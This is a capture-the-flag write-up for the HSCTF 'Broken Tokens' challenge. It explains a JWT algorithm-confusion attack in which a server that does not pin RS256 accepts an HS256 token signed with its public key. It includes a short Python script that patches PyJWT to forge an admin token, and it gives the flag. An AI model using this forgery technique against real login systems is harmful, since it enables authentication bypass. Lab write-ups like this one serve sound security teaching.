# Broken Tokens

## Problem

```
I made a login page, is it really secure?

https://broken-tokens.web.hsctf.com/

Note: If you receive an "Internal Server Error" (HTTP Status Code 500), that means that your cookie is incorrect.

Author: hmmm
```

## Solution
**Note:** *JWT generation script can be found under `broken_script.py` in scripts folder.*

Highly similar to TJCTF task [Moar Horse 4](https://ctftime.org/writeup/20786).

Looking at the given `main.py`:
![](images/broken1.png)

The login form stores an `auth` JSON web token on login. It checks if a specific value in this token, admin, equates to `"admin"` string when decrypted.
We first login using random credentials. 
![](images/broken2.png)
Decoding the `auth` token shows the admin is set to guest, and the JWT algorithm is RS256. RS256 is an asymmetric encryption algorithm, meaning encryption/decryption uses a pair of private and public keys.
The site however does not check the algorithm used. We can exploit this using HS256, a symmetric encryption algorithm
where encryption/decryption uses the same key, instead. 

Using the publickey.pem provided on the site and the script below:
```
import json
import jwt
jwt.algorithms.HMACAlgorithm.prepare_key = lambda self, key : jwt.utils.force_bytes(key)


with open(r"C:\Users\brand\Desktop\publickey.pem", "rb") as file:
    PUBLIC_KEY = file.read()
print("public key : ")
print(PUBLIC_KEY)

data = {
        "auth": "admin"
    }

token = jwt.encode(data, PUBLIC_KEY, "HS256")
print("token : ")
print(token)
```

We can reverse engineer a HS256 encryption digest for the auth JWT token, that the site will decrypt to get admin value to equate to "admin". This allows us to obtain the flag.

![](images/broken3.png)

![](images/broken4.png)

Flag: `flag{1n53cur3_tok3n5_5474212}`